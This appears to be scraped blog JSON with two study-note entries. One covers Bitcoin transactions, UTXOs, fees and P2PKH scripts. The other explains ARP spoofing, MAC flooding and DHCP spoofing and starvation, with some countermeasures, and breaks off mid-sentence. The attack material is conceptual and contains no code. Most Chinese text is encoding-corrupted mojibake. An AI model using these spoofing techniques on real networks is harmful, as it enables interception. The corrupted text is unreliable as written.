\u0026#34;version\u0026#34;: 1, \u0026#34;locktime\u0026#34;: 0, \u0026#34;vin\u0026#34;: [ { \u0026#34;txid\u0026#34;: \u0026#34;7957a35fe64f80d234d76d83a2a8f1a0d8149a41d81de548f0a65a8a999f6f18\u0026#34;, \u0026#34;vout\u0026#34;: 0, \u0026#34;scriptSig\u0026#34; : \u0026#34;3045022100884d142d86652a3f47ba4746ec719bbfbd040a570b1deccbb6498c75c4ae24cb02204 b9f039ff08df09cbe9f6addac960298cad530a863ea8f53982c09db8f6e3813[ALL] 0484ecc0d46f1918b30928fa0e4ed99f16a0fb4fde0735e7ade8416ab9fe423cc5412336376789d1 72787ec3457eee41c04f4938de5cc17b4a10fa336a8d752adf\u0026#34;, \u0026#34;sequence\u0026#34;: 4294967295 } ], \u0026#34;vout\u0026#34;: [ { \u0026#34;value\u0026#34;: 0.01500000, \u0026#34;scriptPubKey\u0026#34;: \u0026#34;OP_DUP OP_HASH160 ab68025513c3dbd2f7b92a94e0581f5d50f654e7 OP_EQUALVERIFY OP_CHECKSIG\u0026#34; }, { \u0026#34;value\u0026#34;: 0.08450000, \u0026#34;scriptPubKey\u0026#34;: \u0026#34;OP_DUP OP_HASH160 7f9b1a7fb68d60c536c2fd8aeaa53a8f3cc025a8 OP_EQUALVERIFY OP_CHECKSIG\u0026#34;, } ] } Transaction Outputs and Inputs è¿™é‡Œæˆ‘ä»¬ç›´æ¥å¼•å…¥ä¸€ä¸ªæ–°çš„æ¦‚å¿µï¼š UTXO (Unspent transaction outputs) æœªè¢«èŠ±è´¹çš„outputsï¼Œä»–å…·æœ‰discrete and indivisible ä¸¤ä¸ªç‰¹æ€§ï¼Œå°±åƒç‰©ç†è´§å¸ä¸€æ ·ï¼Œæ¯ä¸€ä¸ªç¡¬å¸ï¼Œæ¯ä¸€å¼ é’ç¥¨ï¼Œä½ åœ¨æ¶ˆè´¹çš„æ—¶å€™ï¼Œä¸èƒ½æŠŠå®ƒæ‹†å¼€æ¥ä½¿ç”¨ä¸€æ ·ï¼Œå¹¶ä¸”ä¸€æ—¦ç”¨å‡ºï¼Œä½ å¾—åˆ°çš„æ‰¾é›¶ä¹Ÿæ˜¯å…¶ä»–çš„è´§å¸ã€‚ æ‰€æœ‰çš„Transactionæ•´ä¸ªè¿‡ç¨‹ä¸­éƒ½æ˜¯æ¶‰åŠåˆ°UTXO  Received Bitcoin Wallet é€šè¿‡æ£€æµ‹æ•´ä¸€ä¸ªbitcoin network, å‘ç°æœ‰ä¸å½“å‰é’±åŒ…æ‰€æ§åˆ¶çš„bitcoin address ç›¸å…³çš„UTXO å­˜åœ¨  Bitcoin Balance Wallet å¯¹æ‰€æœ‰è¿™äº›æ£€æµ‹åˆ°çš„å¯ä»¥ä½¿ç”¨çš„UTXO åšä¸€ä¸ªæ€»å’Œï¼Œå°±æ˜¯å½“å‰çš„ä½™é¢balance  Spend UTXO  å°†å¤šä¸ªUTXO æ±‡æ€»/ç›´æ¥ä½¿ç”¨ä¸€ä¸ªå¤§é¢åº¦çš„UTXO  å·®å€¼ä½œä¸ºæ‰¾é›¶ç”Ÿæˆæ–°çš„UTXO è¿”å›é’±åŒ…  è¿™åŒæ—¶ä¹Ÿä»£è¡¨ç€æ–°çš„UTXO çš„äº§ç”Ÿ  ä¸åŒå¤§å°çš„UTXOçš„ä¸æ–­æ±‡æ€»ï¼Œåˆ†æ•£ï¼Œä½†æ˜¯å½¢æˆäº†ä¸€æ¡chain    Coinbase transaction å…ˆæœ‰é¸¡ï¼Œè¿˜æ˜¯å…ˆæœ‰è›‹çš„é—®é¢˜ï¼Œæœ€æ‰¾çš„UTXO ä»å“ªé‡Œæ¥çš„å‘¢ï¼Ÿ è¿™é‡Œå°±è¦å¼•å…¥ä¸€ä¸ªæ–°çš„æ¦‚å¿µcoinbase transaction ä¹Ÿå°±æ˜¯æ¯ä¸ªblockç”±mineråˆ›é€ çš„ä¸€ä¸ªç‰¹æ®Šçš„transactionï¼Œ åŒ…å«äº†åˆ›é€ æ–°çš„block çš„å¥–åŠ±ä»¥åŠæ‰€æœ‰çš„transaction feesï¼Œè¿™ä¸ªå°±æ˜¯æœ€åˆå§‹äº§ç”Ÿçš„UTXO   Transaction Outputs \u0026ldquo;Every bitcoin transaction creates outputs ,which are recorded on the bitcoin ledger.\u0026rdquo;  Transcation outputs ç”±ä¸¤éƒ¨åˆ†ç»„æˆ  ä¸€å®šæ•°é‡çš„bitcoin, ç”¨ satoshis æ¥è¡¨ç¤º  ä¸€ä¸ªå¯†ç å­¦é¢˜ç›®ï¼Œç”¨æ¥å†³å®šå¦‚æœä½¿ç”¨è¿™ä¸ªoutput (A cryptographic puzzle: locking script, witness script, or a scriptPubKey)     æ­¤æ—¶æˆ‘ä»¬å†å›è¿‡å¤´æ¥ä¹‹å‰transcationçš„å†…å®¹ï¼Œvalue outéƒ¨åˆ†å°±å¾ˆå¥½ç†è§£äº†ï¼Œå°±æ˜¯ç”¨ satoshis è¡¨ç¤ºçš„ä¸€éƒ¨åˆ†value ä»¥åŠç”¨scriptPubkeyè¡¨ç¤ºçš„ä¸€ä¸ª puzzle, æˆ‘ä»¬ä¹‹åä¼šè®²åˆ°å¦‚ä½•lock+unlock è¿™ä¸ªscriptPubKey \u0026#34;vout\u0026#34;: [ { \u0026#34;value\u0026#34;: 0.01500000, \u0026#34;scriptPubKey\u0026#34;: \u0026#34;OP_DUP OP_HASH160 ab68025513c3dbd2f7b92a94e0581f5d50f654e7 OP_EQUALVERIFY OP_CHECKSIG\u0026#34; }, { \u0026#34;value\u0026#34;: 0.08450000, \u0026#34;scriptPubKey\u0026#34;: \u0026#34;OP_DUP OP_HASH160 7f9b1a7fb68d60c536c2fd8aeaa53a8f3cc025a8 OP_EQUALVERIFY OP_CHECKSIG\u0026#34;, } ] Transaction serialisation \u0026ndash; outputs æˆ‘ä»¬çŸ¥é“æ‰€æœ‰çš„Transaction éƒ½ä¼šåœ¨æ•´ä¸ªbitcoin networkä¸­ä¼ é€’ï¼ŒåŒæ—¶ä¹Ÿä¼šè¢«ä¿å­˜åœ¨å„ä¸ªèŠ‚ç‚¹ä¸Š(bitcoin libraries) é‚£ä¹ˆä¸ºäº†ä¼ è¾“ä»¥åŠä¿å­˜çš„æ–¹ä¾¿ï¼Œå°±æœ‰äº†ä¸¤ç§å½¢å¼ï¼š  ç¬¬ä¸€ç§å°±æ˜¯æˆ‘ä»¬ä¹‹å‰è§åˆ°è¿‡çš„ç”¨æ•°æ®ç»“æ„è¿›è¡Œå­˜å‚¨  ç¬¬äºŒç§å°±æ˜¯è½¬æ¢æˆbyte stream çš„å½¢å¼ï¼Œæ–¹ä¾¿ç”¨äºç½‘ç»œçš„ä¼ è¾“   ä»–ä»¬ä¹‹å‰çš„è½¬æ¢å°±è¢«æˆ‘ä»¬ç§°ä¸ºåºåˆ—åŒ–serialisation ä»¥åŠååºåˆ—åŒ– deserialisation  æ•°æ®ç»“æ„ -\u0026gt; byte-stream: serialisation     byte-stream -\u0026gt; æ•°æ®ç»“æ„ï¼šdeserialisation   Transaction Inputs Transaction inputs åˆ¶å®šäº†å“ªäº›UTXO å°†è¦è¢«ç”¨åˆ°æœ¬æ¬¡transaction å½“ä¸­ï¼Œå¹¶ä¸ºå…¶æä¾›unlocking scriptçš„proof of ownership å½“walletå¼€å§‹è¿›è¡Œä¸€æ¬¡transaction çš„æ—¶å€™ï¼Œå®ƒä¼šä»è¯¥wallet æ‰€æ§åˆ¶çš„æ‰€æœ‰UTXOä¸­é€‰æ‹©ç¬¦åˆè¦æ±‚çš„ï¼Œä¸€å®šæ•°é‡çš„UTXO æ¥è¿›è¡Œ  Transaction Inputs åŒ…å«ä¸¤ä¸ªéƒ¨åˆ†   ä¸€ä¸ªæŒ‡å‘å¯¹åº”çš„ä¸€ä¸ª UTXO çš„æŒ‡é’ˆ ï¼ˆé€šè¿‡è¿™ä¸ªæŒ‡é’ˆï¼ŒåŒ…æ‹¬hash id \u0026amp; sequence number, æˆ‘ä»¬å¯ä»¥åœ¨blockchainä¸Šæ‰¾åˆ°è¿™ä¸ªUTXO å¯¹åº”çš„ä¿¡æ¯ï¼‰ ä¸€ä¸ª unlocking script ï¼ˆç”¨äºæ»¡è¶³UTXOçš„ locking scriptçš„ä½¿ç”¨æ¡ä»¶ï¼‰ æˆ‘ä»¬ç»§ç»­é€šè¿‡ä¹‹å‰çš„ä¾‹å­æ¥çœ‹transaction inputs \u0026#34;vin\u0026#34;: [ { \u0026#34;txid\u0026#34;: \u0026#34;7957a35fe64f80d234d76d83a2a8f1a0d8149a41d81de548f0a65a8a999f6f18\u0026#34;, \u0026#34;vout\u0026#34;: 0, \u0026#34;scriptSig\u0026#34; : \u0026#34;3045022100884d142d86652a3f47ba4746ec719bbfbd040a570b1deccbb6498c75c4ae24cb02204 b9f039ff08df09cbe9f6addac960298cad530a863ea8f53982c09db8f6e3813[ALL] 0484ecc0d46f1918b30928fa0e4ed99f16a0fb4fde0735e7ade8416ab9fe423cc5412336376789d1 72787ec3457eee41c04f4938de5cc17b4a10fa336a8d752adf\u0026#34;, \u0026#34;sequence\u0026#34;: 4294967295 } ] è¿™æ¡ Inputs çš„è®°å½•åŒ…å«äº†å››ä¸ªéƒ¨åˆ†ï¼š  Transaction ID æŒ‡å‘äº†æˆ‘ä»¬éœ€è¦çš„UTXOæ‰€å¯¹åº”çš„Transaction  Output index (vout) ç”¨äºæŒ‡ç¤ºå¯¹åº”çš„é‚£ä¸ªTransactionä¸­æˆ‘ä»¬éœ€è¦çš„UTXO è®°å¾—æˆ‘ä»¬ä¹‹å‰æåˆ°çš„ä¸åŒformsçš„transactionå—ï¼Œå…¶ä¸­æœ‰ä¸€ç§å°±æ˜¯å­˜åœ¨å¾ˆå¤šçš„outputsï¼Œä¹Ÿå°±æ˜¯ç”Ÿæˆäº†å¾ˆå¤šæ–°çš„UTXO, æˆ‘ä»¬éœ€è¦æŒ‡å‡ºæˆ‘ä»¬æœ¬æ¬¡éœ€è¦çš„å…·ä½“æ˜¯å“ªä¸€ä¸ª  scriptSigï¼Œç”¨äºunlockå¯¹åº”UTXOçš„locking script  sequence number   ç»†å¿ƒçš„äººå¯èƒ½ä¼šå‘ç°ï¼Œåœ¨è¿™æ¡å…³äºinputsçš„è®°å½•ä¸­ä¼¼ä¹å°‘äº†ç‚¹ä»€ä¹ˆï¼Œä½œä¸ºä¸€ä¸ªè½¬è´¦è®°å½•ï¼Œå®ƒç¼ºå°‘æœ€é‡è¦çš„ä¸œè¥¿ï¼Œå°±æ˜¯â€œå¤šå°‘é’±â€ å®Œå…¨æ²¡æœ‰bitcoin value ä»¥åŠ locking scriptçš„ä¿¡æ¯ è¿™ä¹Ÿæ˜¯ä½œè€…æé†’å„ä½å¼€å‘è€…çš„ä¿¡æ¯ï¼Œæ¯æ¬¡åœ¨å¤„ç†transaction ç‰¹åˆ«æ˜¯inputsçš„æ—¶å€™ï¼Œæˆ‘ä»¬éƒ½éœ€è¦åˆ©ç”¨ Transaction ID å»ä¸»åŠ¨å»è·å–å¯¹åº”çš„ UTXO çš„ä¿¡æ¯(getrawtrasaction and decoderawtrasaction) æ¯”å¦‚ä»¥è¿™æ¡è®°å½•ä¸ºä¾‹ï¼ŒæŸ¥è¯¢åˆ°çš„ç»“æœå°±æ˜¯ \u0026#34;vout\u0026#34;: [ { \u0026#34;value\u0026#34;: 0.10000000, \u0026#34;scriptPubKey\u0026#34;: \u0026#34;OP_DUP OP_HASH160 7f9b1a7fb68d60c536c2fd8aeaa53a8f3cc025a8 OP_EQUALVERIFY OP_CHECKSIG\u0026#34; } ] Transaction serializationâ€”inputs Transaction inputsçš„å­˜å‚¨å’Œä¼ è¾“åŒæ ·ä¹Ÿéœ€è¦ç”¨åˆ°åºåˆ—åŒ–å’Œååºåˆ—åŒ–  Transaction fee  è®¾ç½®transaction fee çš„ç›®çš„ï¼Ÿ  ç»™äºˆminersè®°è´¦çš„å¥–åŠ±  é€šè¿‡è®¾ç½®transaction fee å…¶å®å¸¦æ¥çš„æ˜¯ä¸€ä¸ªå®‰å…¨æœºåˆ¶ï¼Œä¹Ÿå°±æ˜¯è¯´attackers ä¸åŒé€šè¿‡å¤§é‡çš„transactionæ¥floodç½‘ç»œï¼Œå› ä¸ºè¿™æ ·ä¼šäº§ç”Ÿå¤§é‡çš„æ¶ˆè€—    å¦‚ä½•å†³å®š transcation fee çš„æ•°é‡ï¼Ÿ   æœ€å¼€å§‹æ˜¯æ’å®šçš„   åæ¥å¼€å§‹å¯ä»¥è‡ªç”±è®¾ç½®    Transaction fee çš„å¤šå°‘æœ‰ä»€ä¹ˆå½±å“ Transaction feeçš„æ•°é‡ç›´æ¥å†³å®šäº†å¯¹åº”çš„è¿™ä¸ª transaction è¢«å¤„ç†çš„ä¼˜å…ˆçº§ï¼Œæ•°é‡è¶Šå¤šï¼Œå°±æ›´æœ‰å¯èƒ½è¢«åŒ…å«åœ¨ä¸‹ä¸€ä¸ªblockä¸­ ç›¸å¯¹çš„ï¼Œå¦‚æœä½ è®¾çš„è¶Šä½ï¼Œæˆ–è€…æ ¹æœ¬ä¸è®¾ï¼Œå¾ˆå¯èƒ½ä¼šå› ä¸ºbest-effortè€Œè¢«æ”¾åˆ°å¾ˆåé¢æ¥æ‰§è¡Œï¼Œç”šè‡³æ ¹æœ¬æ°¸è¿œéƒ½ä¸ä¼šè¢«å¤„ç†  Adding Fees to Trasactions æˆ‘ä»¬è§‚å¯Ÿä¹‹å‰çš„transactionçš„æ•°æ®ç»“æ„ï¼Œé‡Œé¢å¹¶æ²¡æœ‰ä»»ä½•çš„å˜é‡æŒ‡å‘transaction feeï¼Œé‚£ä¹ˆå…¶å®è¿™é‡Œæ˜¯éœ€è¦æå‰è‡ªè¡Œä»æ‰¾é›¶çš„chargeä¸­æ‰£é™¤ä¸€éƒ¨åˆ†çš„bitcoin valueï¼Œå¦‚æœå¿˜è®°åšäº†è¿™ä¸€ç‚¹ï¼Œå°±ä¼šæŠŠæ•´ä¸€ä¸ªchargeä»˜ç»™minerã€‚å½“æˆ‘ä»¬ä¸»åŠ¨æ‰£é™¤ä¹‹åï¼Œé‚£ä¹ˆåœ¨åæœŸç»“ç®—çš„æ—¶å€™ï¼Œå°±å¯ä»¥å‘ç°æœ‰ä¸€äº›æœªè¢«åˆ†é…çš„bitcoin valueï¼Œè¿™äº›å°±ä¼šè¢«å½“ä½œæ˜¯transaction feeã€‚ Fees = Sum(Inputs) â€“ Sum(Outputs) å°±å¦‚ä¸‹å›¾çš„ä¸€æ¬¡transactionä¸€æ ·ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°å³ä¾§çš„outputsä¸­ï¼Œç»¼åˆä¸º0.995 BTCï¼Œä¹Ÿå°±æ˜¯æ‰£é™¤äº†transaction feeä¹‹åçš„ç»“æœ    Transaction validation åœ¨è¿™ä¸€ç« ï¼Œæˆ‘ä»¬æ¥å…·ä½“è®²è®²æ¯ä¸€ä¸ªtransactionè¦å¦‚ä½•å¾—åˆ°éªŒè¯ï¼Œæˆ‘ä»¬å…ˆå†æ¥å›é¡¾ä¸€ä¸‹æ„æˆä¸€ä¸ªtransactionæ‰€éœ€è¦çš„inputså’Œoutputsæ˜¯ç”±ä»€ä¹ˆç»„æˆçš„ã€‚  Transaction Inputs åŒ…å«ä¸¤ä¸ªéƒ¨åˆ†   ä¸€ä¸ªæŒ‡å‘å¯¹åº”çš„ä¸€ä¸ª UTXO çš„æŒ‡é’ˆ ï¼ˆé€šè¿‡è¿™ä¸ªæŒ‡é’ˆï¼ŒåŒ…æ‹¬hash id \u0026amp; sequence number, æˆ‘ä»¬å¯ä»¥åœ¨blockchainä¸Šæ‰¾åˆ°è¿™ä¸ªUTXO å¯¹åº”çš„ä¿¡æ¯ï¼‰ ä¸€ä¸ª unlocking script ï¼ˆç”¨äºæ»¡è¶³UTXOçš„ locking scriptçš„ä½¿ç”¨æ¡ä»¶ï¼‰  Transcation outputs ç”±ä¸¤éƒ¨åˆ†ç»„æˆ  ä¸€å®šæ•°é‡çš„bitcoin, ç”¨ satoshis æ¥è¡¨ç¤º  ä¸€ä¸ªå¯†ç å­¦é¢˜ç›®ï¼Œç”¨æ¥å†³å®šå¦‚æœä½¿ç”¨è¿™ä¸ªoutput (A cryptographic puzzle: locking script, witness script, or a scriptPubKey)     æˆ‘ä»¬å¯ä»¥è§‚å¯Ÿåˆ°ä»–ä»¬éƒ½åŒ…å«äº†ä¸€ä¸ªæ¦‚å¿µå«åš script ï¼Œä¸­æ–‡æˆ‘ä»¬ä¸€èˆ¬ç¿»è¯‘ä¸ºè„šæœ¬ï¼Œæ„æ€æ˜¯ä¸€æ®µå¯ä»¥æ‰§è¡Œçš„æŒ‡ä»¤ï¼Œä¸€å¼€å§‹æˆ‘æ¥è§¦è¿™ä¸ªæ¦‚å¿µçš„æ—¶å€™æˆ‘ä¹Ÿè§‰å¾—å¾ˆå¥‡æ€ªï¼Œä¸ºä»€ä¹ˆè¦åœ¨inputså’Œoutputsä¸­æ”¾è„šæœ¬å‘¢ï¼Œä»–ä»¬åˆè¦å¦‚ä½•è¿è¡Œå‘¢ï¼Œæˆ‘ä»¬æ¥ç€ä¸€èµ·æ¥æ¥çœ‹ã€‚ å…ˆè¯´ç»“è®ºï¼Œè¿™äº›è„šæœ¬ç¡®å®å¯ä»¥è¿è¡Œï¼Œ unlocking script ä»¥åŠ locking script ç»“åˆåœ¨ä¸€èµ·ï¼Œå¯ä»¥ç»„æˆç®€å•çš„è®¡ç®—ï¼Œå¾—åˆ° True / False çš„ç»“æœæ¥å†³å®šæœ¬æ¬¡ transaction æ˜¯å¦æˆç«‹ï¼Œå¦‚æœæˆç«‹ï¼Œé‚£ä¹ˆ UTXO å°†ä¼šè¢« spent ä¹Ÿå°±ä» UTXO set ä¸­è¢«ç§»é™¤äº†ã€‚  Pay-to-Public-Key-Hash script  A locking script  is a spending condition placed on an output  also called scriptPubKey, witness script, crytographic puzzle  it usually contained a public key or bitcoin address (public key hash)    A unlocking script  is a script that \u0026ldquo;solves,\u0026rdquo; or satisfies, the conditions placed on an output by a locking script and allows the output to be spent  also called scriptSig  contain a digital signature produced by the user\u0026rsquo;s wallet from his or her private key     æˆ‘ä»¬ç”¨ä¹‹å‰Aliceåœ¨Bobçš„å’–å•¡é¦†ä¹°å’–å•¡çš„ä¾‹å­æ¥æ¼”ç¤ºå…·ä½“éœ€è¦å¦‚ä½•æ¥éªŒè¯ä¸€æ¬¡transaction:   Aliceå‘èµ·äº†ä¸€æ¬¡ä»˜æ¬¾ï¼Œå¥¹ä½¿ç”¨è‡ªå·±é’±åŒ…ä¸­çš„UTXOä½œä¸ºinputsï¼Œç„¶åäº§ç”Ÿä¸€ä¸ªoutputç»™å’–å•¡é¦†ï¼Œä¸€ä¸ªoutputä½œä¸ºæ‰¾é›¶è¿”å›ç»™è‡ªå·±   å‘ç»™å’–å•¡é¦†çš„transaction outputå°†ä¼šåŒ…å«ä¸€ä¸ªlocking scriptå¦‚ä¸‹: OP_DUP OP_HASH160 \u0026lt;Cafe Public Key Hash\u0026gt; OP_EQUALVERIFY OP_CHECKSIG   OPå¼€å¤´çš„å­—ç¬¦ä¸²éƒ½è¡¨ç¤ºscriptæŒ‡ä»¤ï¼Œé‚£ä¹ˆè¿™ä¸€ä¸²locking scriptå°±åŒ…å«äº†ä¸€ç³»åˆ—çš„æŒ‡ä»¤å’Œå’–å•¡é¦†çš„public key hash   å½“Bobçš„å’–å•¡é¦†éœ€è¦æ¶ˆè´¹è¿™ä¸ªinput(UTXO)çš„æ—¶å€™ï¼Œå°±éœ€è¦åˆ©ç”¨å®ƒçš„unlocking scriptæ¥è§£é”ä¹‹å‰çš„locking script,å…¶ä¸­åº”è¯¥åŒ…å«ä¸¤ä¸ªéƒ¨åˆ† \u0026lt;Cafe Signature\u0026gt; \u0026lt;Cafe Public Key\u0026gt;   é‚£ä¹ˆå½“locking scriptå’Œunlocking scriptæ‹¼æ¥åœ¨ä¸€èµ·çš„æ—¶å€™ï¼Œå°±ç»„æˆäº†ä¸€ä¸ªå®Œæ•´çš„è„šæœ¬ \u0026lt;Cafe Signature\u0026gt; \u0026lt;Cafe Public Key\u0026gt; OP_DUP OP_HASH160 \u0026lt;Cafe Public Key Hash\u0026gt; OP_EQUALVERIFY OP_CHECKSIG   å¦‚æœéªŒè¯çš„ç»“æœä¸ºTRUEçš„è¯å°±éªŒè¯æˆåŠŸäº†   æˆ‘ä»¬å¯ä»¥çœ‹çœ‹å…·ä½“çš„éªŒè¯è¿‡ç¨‹ï¼Œè¿™é‡Œçš„è„šæœ¬è¯­è¨€æ˜¯åŸºäºstackæ ˆå®ç°çš„ï¼š   å°†signatureå‹å…¥æ ˆ  å°†Public keyå‹å…¥æ ˆ  ä½¿ç”¨DUPæŒ‡ä»¤æ¥å¤åˆ¶æ ˆé¡¶çš„å†…å®¹å¹¶å‹å…¥æ ˆ     ä½¿ç”¨HASH160æ¥å¤„ç†æ ˆé¡¶çš„å†…å®¹å¹¶å°†ç»“æœå‹å…¥æ ˆHASH160(PubK) = \u0026lt;PubKHash\u0026gt;  å°†åŸæœ¬locking scriptä¸­çš„\u0026lt;PubKHash\u0026gt;å‹å…¥æ ˆ  ä½¿ç”¨æŒ‡ä»¤EQUALVERIFYæ¥æ¯”è¾ƒæ ˆé¡¶çš„ä¸¤ä¸ª \u0026lt;PubKHash\u0026gt; æ˜¯å¦ç›¸ç­‰ï¼Œå¦‚æœç›¸ç­‰ï¼Œåˆ™å…¨éƒ¨ç§»å‡ºæ ˆ  æœ€åä½¿ç”¨æŒ‡ä»¤CHECKSIGæ¥éªŒè¯ \u0026lt;PubK\u0026gt; ä¸ \u0026lt;sig\u0026gt; æ˜¯å¦åŒ¹é…ï¼ˆæœ¬è´¨ä¸Šåˆ¤æ–­æ˜¯ä¸æ˜¯ä¸€å¯¹public key å’Œ private keyï¼‰ï¼Œå¦‚æœåŒ¹é…æˆåŠŸï¼Œè¿”å›Trueï¼ŒéªŒè¯æˆåŠŸ   è¿™é‡Œé™„å¸¦ä¸€ä¸ª Bitcoin Address çš„äº§ç”Ÿè¿‡ç¨‹  ","date":"2022-04-24T00:00:00Z","permalink":"https://ginkgo.org.cn/posts/mb2_chapter_6/","title":"Mastering Bitcoin 2nd Edition Chapter 6: Transactions"},{"content":"Spoofing, flooding and amplification Spoofing ARP spoofing   ARP\n  Layer identifiers\nRoutingæ˜¯network communicationä¸­é‡è¦çš„ä¸€ç¯ï¼Œcomputer nodeåœ¨é€šä¿¡ä¹‹å‰ï¼Œéœ€è¦çŸ¥é“è‡ªå·±åœ¨ä¸è°è”ç³»ï¼Œè¦é€šè¿‡ä»€ä¹ˆè·¯å¾„å»è”ç³» é‚£ä¹ˆlayer identifier å°±ä»£è¡¨ç€æ¯ä¸€ä¸ªcomputer node  Internet Layer identifier: IP address (assigned by users or by software, such as DHCP)  Link Layer Identifier: MAC Address (hardware address, physical address)       ARP (Address Resolution Protocol)\naims to translate from IP address to MAC address    ARP request message generation\n å½“æœ‰IP packetéœ€è¦å‘å‡ºçš„æ—¶å€™ï¼ŒARPå°±ä¼šè¢«hardware driver æ‰€è°ƒç”¨  é¦–å…ˆè·å–IP destination address  ç„¶ååœ¨ARPæœ¬åœ°çš„ translation table ä¸­æŸ¥æ‰¾æ˜¯å¦æœ‰å¯¹åº”å¾—IP address : MAC address entry  æœ‰çš„è¯ï¼Œå°±æŠŠ48-bitsçš„MAC addresså‘é€ç»™ hardware driver  æ²¡æœ‰çš„è¯ï¼Œå°±å‡†å¤‡å‘é€ARPè¯·æ±‚ï¼Œå¡«å……ç›¸å…³ä¿¡æ¯  sender MAC address  sender IP address  target IP address  target MAC address (broadcast address: 00:00:00:00:00:00)      ARP request messageåœ¨link layerè¢«å°è£…æˆframe ç„¶åå‘é€å‡ºå»       ARP request message reception\n ç›®æ ‡èŠ‚ç‚¹å°†ä¼šå›å¤å…¶æ‰€åŒ…å«çš„MAC address, ï¼ˆå¦‚æœé€šä¿¡çš„æ˜¯å…¶ä»–ç½‘ç»œçš„èŠ‚ç‚¹ï¼Œé‚£ä¹ˆæ­¤å¤„å¯»æ‰¾çš„å°±æ˜¯ç½‘å…³çš„MAC address)  å…¶ä»–æ”¶åˆ°è¯·æ±‚çš„èŠ‚ç‚¹ä¼šæ›´æ–°ä»–ä»¬çš„ translation table (IP address : MAC address entry) ç„¶åä¸¢å¼ƒè¿™ä¸ªåŒ…       ARP rely message reception\n ARP rely æ˜¯å•æ’­ï¼Œä¼šç›´æ¥å‘é€å›å‘é€è€…       ARP translation table (ARP table, ARP cache)\n é€šè¿‡ARP cache æ¥ä¿å­˜IP address : MAC address entry æ¥èŠ‚çœç©ºé—´  è¡¨å†…çš„entryä¼š ageing  ARP æ˜¯æ— çŠ¶æ€åè®®ï¼Œå› æ­¤åªè¦æ”¶åˆ°äº†request/reply ä»–ä»¬å°±ä¼šè‡ªåŠ¨æ›´æ–°         RARP (Reverse ARP)\naims to translate from MAC address to IP address        ARP spoofing attack\nARP spoofingä¸»è¦çš„ç›®çš„å°±æ˜¯æ±¡æŸ“åŸæœ¬çš„ARP cacheï¼Œå°†Computer Aå­˜æ”¾çš„å…³äº Computer Bçš„ä¿¡æ¯ï¼Œæ”¹ä¸ºattackerçš„ï¼Œè¿™æ ·Aåœ¨ç»™Bå‘frameçš„æ—¶å€™ï¼Œå°±ä¼šå‘ç»™attacker    countermeasure\n è®¾ç½® Arp cache çš„è¿‡æœŸæ—¶é—´, expire  ä¸€äº›ç³»ç»Ÿé€šè¿‡unicast æ¥æ›´æ–°cache è¡¨ï¼Œè€Œä¸æ˜¯åƒä¹‹å‰é‚£æ ·æ— çŠ¶æ€çš„æ›´æ–°  Against countermeasure  Attackerå¯ä»¥é€šè¿‡å®šæœŸå‘é€ ARP spoof packet (every ~40s) æ¥é¿å…ä»¥ä¸Šæ–¹æ³•    Static ARP table é™æ€ARPè¡¨  æ¯æ¬¡å¯åŠ¨åŠ è½½åˆ°RAMä¸­  æ²¡æœ‰ARP requestä¸»åŠ¨å‘é€           Man-in-the-middle attack with ARP spoofing\né€šè¿‡ARP spoofing æ±¡æŸ“ä¸¤/å¤šå°ç”µè„‘çš„ ARP cache ï¼Œä½¿ä»–ä»¬çš„é€šä¿¡destinationéƒ½æŒ‡å‘attackerï¼Œä»è€Œæˆªå–é€šä¿¡å†…å®¹(attacker node è¿›è€Œè½¬å‘é€šä¿¡ï¼Œå› ä¸ºå®ƒçŸ¥é“IP addressæ‰€å¯¹åº”çš„æ­£ç¡®çš„MAC address)      MAC flooding\næ¯ä¸ªswitch ä¼šå†…ç½®ä¸€ä¸ª CAM (Content Addressable memory) è¡¨ï¼Œç”¨äºè®°å½•ä¸åŒçš„MAC addressæ‰€å¯¹åº”çš„port number æ¯å½“æœ‰frame ç»è¿‡ switches, switchå°±ä¼šé€šè¿‡è¿™ä¸ª table æ¥å®ç°è½¬å‘ MAC floodingå°±æ˜¯ä½¿ç”¨å¤§é‡çš„spoofed frameæ¥å¡«å……switch çš„è½¬å‘è¡¨ï¼Œä»è€Œå æ»¡ switch æ‰€æœ‰çš„å†…å­˜ç©ºé—´ï¼Œä½¿æ­£å¸¸çš„frameçš„è½¬å‘ç­–ç•¥æ— æ³•åŠ å…¥tableï¼Œæœ€ç»ˆå°±ä¼šå¯¼è‡´æ­£å¸¸çš„frame é€šä¿¡å› ä¸ºæ²¡æœ‰å¯¹åº”çš„portè€Œ è¢«è¿«å¹¿æ’­ ï¼Œä½¿attackerå¯ä»¥åˆ©ç”¨snifferæ‰€ç›‘å¬åˆ°ã€‚    DHCP spoofing   DHCP (Dynamic Host Configuration Protocol)\nDHCPæ˜¯ç”¨æ¥è‡ªåŠ¨çš„ç»™å…¶ä»–çš„ç”¨æˆ·åˆ†é…IPåœ°å€ä»¥åŠå…¶ä»–ç›¸å…³é…ç½®çš„ï¼ˆç½‘å…³ï¼ŒDNSæœåŠ¡å™¨ç­‰ï¼‰åè®® Protocol operations : 1. Discovery - client å¹¿æ’­ DHCP Discovery message æ¥å¯»æ‰¾server 2. Offer serverå•æ’­æä¾›IPç»™client 3. Request client å‘é€æ¥æ”¶IPçš„message 4. Acknowledge serverç¡®è®¤clientæ„¿æ„æ¥å—å¹¶å‘é€IPä»¥åŠå…¶ä»–çš„é…ç½®ä¿¡æ¯   \u0026lt;br/\u0026gt;      DHCP spoofing attack\nDHCP spoofing ä¸»è¦æ˜¯é€šè¿‡å‘DHCP serverå‘é€å¤§é‡çš„ Spoofed DHCP request message æ¥ å ç”¨ IPæ± é‡Œçš„æ‰€æœ‰å¯åˆ†é…çš„IPï¼Œç„¶åå†ä½¿ç”¨ä¸€å°å‡çš„DHCP serveræ¥å›å¤clientæ‰€å‘å‡ºçš„DHCP discovery messageï¼Œè¿›è€Œæ§åˆ¶è¿™äº›clientçš„IPä»¥åŠå…¶ä»–é…ç½®ï¼ˆç½‘å…³ï¼ŒDNS serveråœ°å€ï¼‰ã€‚ æ­£å¸¸çš„DHCP request messageï¼š  Spoofed DHCP discovery message: åˆ©ç”¨å¤§é‡è™šå‡çš„MACåœ°å€æ¥å ç”¨å¯åˆ†é…çš„IPåœ°å€  DHCP starvation :\né€šè¿‡å‘é€å¤§é‡çš„å¸¦æœ‰ä¼ªé€ MAC Addressçš„DHCP request messageæ¥å ç”¨æ‰€æœ‰çš„IPæ± ä¸­çš„IPåœ°å€ï¼Œè¿›è€Œä½¿ç”¨å‡çš„DHCP 